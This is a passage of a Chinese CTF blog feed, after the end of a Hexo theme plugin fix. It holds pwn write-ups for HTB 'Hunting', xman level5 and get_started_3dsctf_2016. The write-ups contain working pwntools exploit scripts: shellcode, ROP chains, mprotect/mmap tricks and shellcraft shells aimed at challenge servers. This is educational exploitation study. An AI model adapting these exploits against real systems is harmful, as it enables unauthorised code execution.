class="line">                 &lt;span&gt;| &lt;&#x2F;span&gt;</span><br><span class="line">             &lt;% &#125; %&gt;</span><br><span class="line">             &lt;% if (theme.visit_counter.page_visit) &#123; %&gt;</span><br><span class="line">                </span><br><span class="line">                     &lt;span id&#x3D;&quot;page-visit&quot;  title&#x3D;&quot;&lt;%&#x3D; __(&#39;visit_counter.page&#39;) %&gt;&quot;&gt;&lt;i class&#x3D;&quot;fa fa-eye animated infinite pulse&quot; aria-hidden&#x3D;&quot;true&quot;&gt;&lt;&#x2F;i&gt;&lt;span id&#x3D;&quot;busuanzi_value_page_pv&quot;&gt;&lt;&#x2F;span&gt;</span><br><span class="line">                     &lt;&#x2F;span&gt;</span><br><span class="line">                 &lt;&#x2F;span&gt;</span><br><span class="line">             &lt;% &#125; %&gt;</span><br><span class="line">         &lt;&#x2F;div&gt;</span><br><span class="line">     &lt;% &#125; %&gt;</span><br></pre></td></tr></table></figure><p>4.打开<code>after-footer.ejs</code>，删除<code>&lt;script async src=&quot;https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js&quot;&gt;&lt;/script&gt;</code>.</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;今天强迫症又双发作，这次没忍住，折腾了下。重于把hexo-helper-live2d 与busuanzi 两个插件共存时产生冲突的问题解决了。</summary>
    
    
    
    <category term="Yelee" scheme="lexsd6.github.io/categories/Yelee/"/>
    
    
    <category term="problem_resolve" scheme="lexsd6.github.io/tags/problem-resolve/"/>
    
    <category term="node-js" scheme="lexsd6.github.io/tags/node-js/"/>
    
  </entry>
  
  <entry>
    <title>Hunting— HTB  PWN  challenge</title>
    <link href="lexsd6.github.io/2021/11/02/PWN%20Hunting%20challenge%20%E2%80%94%20HTB/"/>
    <id>lexsd6.github.io/2021/11/02/PWN%20Hunting%20challenge%20%E2%80%94%20HTB/</id>
    <published>2021-11-02T12:58:55.864Z</published>
    <updated>2021-11-03T06:32:40.926Z</updated>
    
    <content type="html"><![CDATA[<p>一道htb中，比较有意思的手写shellcode题。<a id="more"></a></p><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      PIE enabled</span><br><span class="line">RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><p>如上，题目是一个32位程序，且保护只开了PIE并开放了读写执行权限。</p><p>分析程序主要流程我们可以看到：</p><p><img src="image-20211102210710626.png" alt="image-20211102210710626"></p><p>程序先mmap一段空间，将flag如这个空间中。</p><p>再用meset把flag原本存放的空间清零。</p><p>然后我们有大小为0x3c来写入我们的后门。</p><p>但是题目设置seccomp沙箱，禁用一些系统调用。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A &#x3D; arch</span><br><span class="line"> 0001: 0x20 0x00 0x00 0x00000000  A &#x3D; sys_number</span><br><span class="line"> 0002: 0x35 0x0a 0x00 0x40000000  if (A &gt;&#x3D; 0x40000000) goto 0013</span><br><span class="line"> 0003: 0x15 0x09 0x00 0x0000000b  if (A &#x3D;&#x3D; execve) goto 0013</span><br><span class="line"> 0004: 0x15 0x08 0x00 0x00000166  if (A &#x3D;&#x3D; execveat) goto 0013</span><br><span class="line"> 0005: 0x15 0x07 0x00 0x00000127  if (A &#x3D;&#x3D; openat) goto 0013</span><br><span class="line"> 0006: 0x15 0x06 0x00 0x00000005  if (A &#x3D;&#x3D; open) goto 0013</span><br><span class="line"> 0007: 0x15 0x05 0x00 0x00000006  if (A &#x3D;&#x3D; close) goto 0013</span><br><span class="line"> 0008: 0x15 0x04 0x00 0x00000008  if (A &#x3D;&#x3D; creat) goto 0013</span><br><span class="line"> 0009: 0x15 0x03 0x00 0x00000056  if (A &#x3D;&#x3D; uselib) goto 0013</span><br><span class="line"> 0010: 0x15 0x02 0x00 0x00000002  if (A &#x3D;&#x3D; fork) goto 0013</span><br><span class="line"> 0011: 0x15 0x01 0x00 0x000000be  if (A &#x3D;&#x3D; vfork) goto 0013</span><br><span class="line"> 0012: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0013: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure><p>由于禁用了execve和open导致我们无法常规getshell或orw</p><p>但经过gdb，我们发现，由于开了PIE,flag的位置是随机的，但是flag位置大小于<code>0x60000000</code>.</p><p><img src="image-20211103102846331.png" alt="image-20211103102846331"></p><p>再进一步分析，可以看到flag在段地址开始的位置。所以我们以<code>0x1000</code>遍历地址，我们就可以发现flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x&#x2F;20gs 0x6b6d0000</span><br><span class="line">warning: Unable to display strings with size &#39;g&#39;, using &#39;b&#39; instead.</span><br><span class="line">0x6b6d0000:     &quot;HTB&#123;&quot;, &#39;X&#39; &lt;repeats 31 times&gt;, &quot;&#125;&quot;</span><br><span class="line">0x6b6d0025:     &quot;&quot;</span><br><span class="line">0x6b6d0026:     &quot;&quot;</span><br><span class="line">0x6b6d0027:     &quot;&quot;</span><br><span class="line">0x6b6d0028:     &quot;&quot;</span><br><span class="line">0x6b6d0029:     &quot;&quot;</span><br><span class="line">0x6b6d002a:     &quot;&quot;</span><br><span class="line">0x6b6d002b:     &quot;&quot;</span><br><span class="line">0x6b6d002c:     &quot;&quot;</span><br><span class="line">0x6b6d002d:     &quot;&quot;</span><br><span class="line">0x6b6d002e:     &quot;&quot;</span><br><span class="line">0x6b6d002f:     &quot;&quot;</span><br><span class="line">0x6b6d0030:     &quot;&quot;</span><br><span class="line">0x6b6d0031:     &quot;&quot;</span><br><span class="line">0x6b6d0032:     &quot;&quot;</span><br><span class="line">0x6b6d0033:     &quot;&quot;</span><br><span class="line">0x6b6d0034:     &quot;&quot;</span><br><span class="line">0x6b6d0035:     &quot;&quot;</span><br><span class="line">0x6b6d0036:     &quot;&quot;</span><br></pre></td></tr></table></figure><h2 id="如何定位flag"><a href="#如何定位flag" class="headerlink" title="如何定位flag"></a>如何定位flag</h2><h3 id="access函数"><a href="#access函数" class="headerlink" title="access函数"></a>access函数</h3><p>经过查阅资料后我们可以发现access函数不仅可以判断某文件名是否存在还在可以判断某地址段是否存在。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">access(<span class="keyword">const</span> <span class="keyword">char</span> *filename,<span class="keyword">int</span> mode);</span><br></pre></td></tr></table></figure><p>当mode 为0 时，判断是否存在。</p><p>当mode 为1时，判断是否有执行权限。</p><p>当mode 为2时，判断是否有写权限。</p><p>当mode 为3时，判断是否有读权限。</p><p>filename参数既可以传入文件名，也可以虚拟内存地址。</p><h3 id="for-循环查找"><a href="#for-循环查找" class="headerlink" title="for 循环查找"></a>for 循环查找</h3><p>由于用access函数，我们可以以<code>0x1000</code>为一个单位来慢慢遍历。</p><p>用c伪代码来表达就是：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">uint32_t</span> address = <span class="number">0x60000000</span>; address &lt; <span class="number">0x7fffffff</span>; address += <span class="number">0x1000</span>)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (access(address + i +<span class="number">4</span>) == EFAULT)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="built_in">write</span>(<span class="number">1</span>, address, <span class="number">0x26</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        </span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用汇编来表达就是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mov edx,0x5fffffff;</span><br><span class="line">xor ecx,ecx;</span><br><span class="line">notaccess:</span><br><span class="line">or dx,0xfff;</span><br><span class="line">inc edx;</span><br><span class="line">mov eax,0x21;</span><br><span class="line">lea  ebx,[edx+4]</span><br><span class="line">int 0x80</span><br><span class="line">cmp eax,0xfffffff2;</span><br><span class="line">jz  notaccess;</span><br><span class="line">mov eax,0x04;</span><br><span class="line">mov ebx,1;</span><br><span class="line">mov ecx,edx;</span><br><span class="line">mov edx,0x26</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">@File    :   exp.py</span></span><br><span class="line"><span class="string">@Time    :   2021/11/02 19:51:09</span></span><br><span class="line"><span class="string">@Author  :   lexsd6</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> libcfind <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local_mote=<span class="number">1</span></span><br><span class="line">elf=<span class="string">'./hunting'</span></span><br><span class="line">e=ELF(elf)</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">context.arch=e.arch</span><br><span class="line">ip_port=[<span class="string">'178.62.96.143'</span>,<span class="number">30132</span>]</span><br><span class="line"></span><br><span class="line">debug=<span class="keyword">lambda</span> : gdb.attach(p) <span class="keyword">if</span> local_mote==<span class="number">1</span> <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local_mote==<span class="number">1</span> :</span><br><span class="line">   p=process(elf)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">   p=remote(ip_port[<span class="number">0</span>],ip_port[<span class="number">-1</span>])</span><br><span class="line"></span><br><span class="line">shell=<span class="string">"""</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov edx,0x5fffffff;</span></span><br><span class="line"><span class="string">xor ecx,ecx;</span></span><br><span class="line"><span class="string">notaccess:</span></span><br><span class="line"><span class="string">or dx,0xfff;</span></span><br><span class="line"><span class="string">inc edx;</span></span><br><span class="line"><span class="string">mov eax,0x21;</span></span><br><span class="line"><span class="string">lea  ebx,[edx+4]</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">cmp eax,0xfffffff2;</span></span><br><span class="line"><span class="string">jz  notaccess;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov eax,0x04;</span></span><br><span class="line"><span class="string">mov ebx,1;</span></span><br><span class="line"><span class="string">mov ecx,edx;</span></span><br><span class="line"><span class="string">mov edx,0x26</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">debug()</span><br><span class="line">p.sendline(asm(shell))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="知识点小记"><a href="#知识点小记" class="headerlink" title="知识点小记"></a>知识点小记</h2><h3 id="汇编指令"><a href="#汇编指令" class="headerlink" title="汇编指令"></a>汇编指令</h3><p>有几个汇编指令搞忘了，在这里小记下。</p><p>lea  x,[y]</p><p>取y对应的地址作为x的值存入。</p><p>mov x,[y]</p><p>取y对应的地址的值作为x的值存入。</p><p>or  x,y</p><p>对x,y进行或运算，并将值存入x中。</p><p>xor x,y</p><p>xor异或运算,当x,y两个不同时结果为1,否则为0.在汇编中有时也用于清零操作，例如 <code>xor eax,eax</code> 清空eax寄存器。</p><h3 id="延长程序时间"><a href="#延长程序时间" class="headerlink" title="延长程序时间"></a>延长程序时间</h3><p>在看大佬博客<a href="https://karol-mazurek95.medium.com/pwn-hunting-challenge-htb-abc635c897db时看到我们在一些时候可以利用系统调用`alarm`来延长程序时间。" target="_blank" rel="noopener">https://karol-mazurek95.medium.com/pwn-hunting-challenge-htb-abc635c897db时看到我们在一些时候可以利用系统调用`alarm`来延长程序时间。</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alarm(<span class="keyword">unsigned</span> <span class="keyword">int</span> seconds);</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;一道htb中，比较有意思的手写shellcode题。</summary>
    
    
    
    <category term="CTF" scheme="lexsd6.github.io/categories/CTF/"/>
    
    <category term="HTB" scheme="lexsd6.github.io/categories/CTF/HTB/"/>
    
    
    <category term="pwn" scheme="lexsd6.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>xman的leve5另一种解法(mprotect)学习与利用</title>
    <link href="lexsd6.github.io/2021/10/20/xman%E7%9A%84leve5%E5%8F%A6%E4%B8%80%E7%A7%8D%E8%A7%A3%E6%B3%95(mprotect)%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%A9%E7%94%A8/"/>
    <id>lexsd6.github.io/2021/10/20/xman%E7%9A%84leve5%E5%8F%A6%E4%B8%80%E7%A7%8D%E8%A7%A3%E6%B3%95(mprotect)%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%A9%E7%94%A8/</id>
    <published>2021-10-20T02:58:44.000Z</published>
    <updated>2021-10-20T03:31:19.407Z</updated>
    
    <content type="html"><![CDATA[<p>当时在xman听大佬将leve5利用时，很疑惑要调用mprotect，明明可以溢出执行<code>system(&#39;/bin/sh&#39;)</code>了. 直到我遇到些奇怪的静态编译题,我真香了故小记一下<a id="more"></a></p><h2 id="mprotect-函数"><a href="#mprotect-函数" class="headerlink" title="mprotect()函数"></a><code>mprotect()</code>函数</h2><p>在Linux中，<code>mprotect()</code>函数可以用来修改一段指定内存区域的保护属性。mprotect()函数把自start开始的、长度为len的内存区的保护属性修改为prot指定的值。</p><p>使用方法：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">mprotect</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> *start, <span class="keyword">size_t</span> len, <span class="keyword">int</span> prot)</span></span>;</span><br></pre></td></tr></table></figure><p>常规使用：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mprotect(addr, len, <span class="number">7</span>);</span><br></pre></td></tr></table></figure><p>start表示一块代码段的起始位置。</p><p>len表示要修改长度，len的大小如果过小，libc会自动来补齐的。</p><p>port 表示权限 即使读（4）写（2）执行（1）</p><h2 id="leve5-exp"><a href="#leve5-exp" class="headerlink" title="leve5 exp"></a>leve5 exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> libcfind <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local_mote=<span class="number">1</span></span><br><span class="line">elf=<span class="string">'./level3_x64'</span></span><br><span class="line">e=ELF(elf)</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">context.arch=e.arch</span><br><span class="line">ip_port=[<span class="string">'node4.buuoj.cn'</span>,<span class="number">26162</span>]</span><br><span class="line"></span><br><span class="line">debug=<span class="keyword">lambda</span> : gdb.attach(p) <span class="keyword">if</span> local_mote==<span class="number">1</span> <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local_mote==<span class="number">1</span> :</span><br><span class="line">   p=process(elf)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">   p=remote(ip_port[<span class="number">0</span>],ip_port[<span class="number">-1</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">rop = ROP(elf)</span><br><span class="line"></span><br><span class="line">print(rop.dump())</span><br><span class="line">p.recvline()</span><br><span class="line">p.sendline(<span class="number">0x88</span>*<span class="string">'1'</span>+p64(<span class="number">0x0000000004006AA</span>)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(e.got[<span class="string">'write'</span>])+p64(<span class="number">8</span>)+p64(e.got[<span class="string">'read'</span>])+p64(<span class="number">1</span>)+p64(<span class="number">0x000000000400690</span>)+<span class="string">'s'</span>*<span class="number">8</span>*<span class="number">7</span>+p64(e.sym[<span class="string">'vulnerable_function'</span>]))</span><br><span class="line"></span><br><span class="line"><span class="comment">#addr=p.recvuntil('\x7f')[:-6].ljust(8,'\x00')</span></span><br><span class="line">addr=u64(p.recv(<span class="number">7</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">log.info(hex((addr)))</span><br><span class="line">x=finder(<span class="string">'read'</span>,addr)</span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">p.sendline(0x88*'1'+p64(0x00000000004006b3)+p64(x.dump('str_bin_sh'))+p64(x.dump('system')))</span></span><br><span class="line"><span class="string">#addr=0x00600000</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">rdx=<span class="number">0x00000000000cb1cd</span>+x.libcbase</span><br><span class="line">rdi=<span class="number">0x0000000000026796</span>+x.libcbase</span><br><span class="line">rsi=<span class="number">0x000000000002890f</span>+x.libcbase</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">debug()</span><br><span class="line"><span class="comment">#p.sendline(0x88*'1'+p64(rdi)+p64(0x00600a00)+p64(rsi)+p64(0x100000)+p64(rdx)+p64(7)+p64(x.dump('mprotect'))+p64(rdi)+p64(0)+p64(rsi)+p64(0x00600a00)+p64(rdx)+p64(0x100)+p64(x.dump('read'))+p64(0x00600a00))</span></span><br><span class="line">p.sendline(<span class="number">0x88</span>*<span class="string">'1'</span>+p64(rdi)+p64(<span class="number">0</span>)+p64(rsi)+p64(<span class="number">0x1000</span>)+p64(rdx)+p64(<span class="number">7</span>)+p64(x.dump(<span class="string">'mmap'</span>))+<span class="string">'1'</span>*<span class="number">8</span>)</span><br><span class="line"><span class="comment">#+p64(rdi)+p64(0)+p64(rsi)+p64(0x00600a00)+p64(rdx)+p64(0x100)+p64(x.dump('read'))+p64(0x00600a00))</span></span><br><span class="line"></span><br><span class="line">p.sendline(asm(shellcraft.sh()))</span><br></pre></td></tr></table></figure><h2 id="利用机会-get-started-3dsctf-2016"><a href="#利用机会-get-started-3dsctf-2016" class="headerlink" title="利用机会-get_started_3dsctf_2016"></a>利用机会-get_started_3dsctf_2016</h2><p>一般情况下mprotect的使用都用点画蛇添足，但是在一些静态编译的题目中就是很有用的。比如：get_started_3dsctf_2016</p><p>这道题是32位的，静态编译中ban了system，但是给mprotect了。由于没有开PIE，我们可以将可控的一段程序写入读写执行权限，然后写入后门，来得到shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">@File    :   2exp.py</span></span><br><span class="line"><span class="string">@Time    :   2021/10/19 13:33:42</span></span><br><span class="line"><span class="string">@Author  :   lexsd6</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> libcfind <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local_mote=<span class="number">1</span></span><br><span class="line">elf=<span class="string">'./get_started_3dsctf_2016'</span></span><br><span class="line">e=ELF(elf)</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">context.arch=e.arch</span><br><span class="line">ip_port=[<span class="string">'node4.buuoj.cn'</span>,<span class="number">29847</span>]</span><br><span class="line"></span><br><span class="line">debug=<span class="keyword">lambda</span> : gdb.attach(p) <span class="keyword">if</span> local_mote==<span class="number">1</span> <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local_mote==<span class="number">1</span> :</span><br><span class="line">   p=process(elf)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">   p=remote(ip_port[<span class="number">0</span>],ip_port[<span class="number">-1</span>])</span><br><span class="line"></span><br><span class="line">gets=<span class="number">0x804f630</span></span><br><span class="line">edi_ret=<span class="number">0x0805099d</span></span><br><span class="line">addr=<span class="number">0x080ea900</span></span><br><span class="line">eax_ret=<span class="number">0x080b91e6</span></span><br><span class="line">ebx_ret=<span class="number">0x080481ad</span></span><br><span class="line">edx_ret=<span class="number">0x0806fc0a</span></span><br><span class="line">ret=<span class="number">0x08048196</span></span><br><span class="line">int80=<span class="number">0x0806d7e5</span></span><br><span class="line">ebx_edx_ret=<span class="number">0x0806fc09</span></span><br><span class="line">write=<span class="number">0x806e1b0</span></span><br><span class="line"><span class="comment">#0x080557ab : mov dword ptr [edx], eax ; ret</span></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"><span class="comment">#0x080d8443 : xchg dword ptr [edx], ecx ; ret</span></span><br><span class="line"><span class="comment">#0x08048a26 : xchg eax, ecx ; ret 交换</span></span><br><span class="line"><span class="comment">#0x08048880 : mov ebx, dword ptr [esp] ; ret</span></span><br><span class="line">ecx_write_edxaddr=<span class="number">0x080557ab</span></span><br><span class="line"><span class="comment">#p.sendline(0x38*'1'+p32(e.sym['malloc'])+p32(0x0809e4c5)+p32(0x100000)+p32(0)+p32(0)+p32(ebx_edx_ret)+p32(1)+p32(addr)+p32(ecx_write_edxaddr)+p32(e.sym['write'])+p32(e.sym['main'])+p32(1)+p32(addr)+p32(4))</span></span><br><span class="line"><span class="comment">#shelladdr=u32(p.recv(4))-8</span></span><br><span class="line"><span class="comment">#log.info(hex(shelladdr))</span></span><br><span class="line">shelladdr=<span class="number">0x080ea000</span></span><br><span class="line">ppp=<span class="number">0x0804f460</span></span><br><span class="line">p.sendline(<span class="number">0x38</span>*<span class="string">'1'</span>+p32(e.sym[<span class="string">'mprotect'</span>])+p32(<span class="number">0x0809e4c5</span>)+p32(shelladdr)+p32(<span class="number">0x200</span>)+p32(<span class="number">7</span>)+p32(e.sym[<span class="string">'gets'</span>])+p32(ret)+p32(shelladdr))</span><br><span class="line">debug()</span><br><span class="line">p.sendline(asm(shellcraft.sh()))</span><br><span class="line"><span class="comment">#p.sendline(asm(shellcraft.sh()))</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;当时在xman听大佬将leve5利用时，很疑惑要调用mprotect，明明可以溢出执行&lt;code&gt;system(&amp;#39;/bin/sh&amp;#39;)&lt;/code&gt;了. 直到我遇到些奇怪的静态编译题,我真香了故小记一下</summary>
    
    
    
    <category term="CTF" scheme="lexsd6.github.io/categories/CTF/"/>
    
    
    <category term="pwn" scheme="lexsd6.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>ctfshow-月饼杯2021-pwn-wp</title>
    <link href="lexsd6.github.io/2021/09/21/ctfshow-%E6%9C%88%E9%A5%BC%E6%9D%AF-pwn-wp/"/>
    <id>lexsd6.github.io/2021/09/21/ctfshow-%E6%9C%88%E9%A5%BC%E6%9D%AF-pwn-wp/</id>
    <published>2021-09-21T06:17:42.396Z</published>
    <updated>2021-09-21T07:10:02.858Z</updated>
    
    <content type="html"><![CDATA[<p>久违参加了ctfshow的比赛，题都比较简单，就是远程环境libc我泄露半天才泄露出来… (⊙﹏⊙) <a id="more"></a></p><h2 id="简单的胖"><a href="#简单的胖" class="headerlink" title="简单的胖"></a>简单的胖</h2><p>题目简单就一个简单amd64位的栈溢出.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> 